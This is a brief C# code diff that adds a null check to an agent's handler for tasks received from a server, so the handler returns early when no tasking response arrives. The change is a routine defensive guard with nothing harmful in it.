@@ -97,6 +97,10 @@ namespace Agent
 
         private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
         {
+            if(args.tasking_response is null)
+            {
+                return;
+            }
 
             args.tasking_response.tasks.ForEach(task => this.taskManager.StartTaskAsync(new ServerJob(task)));
 
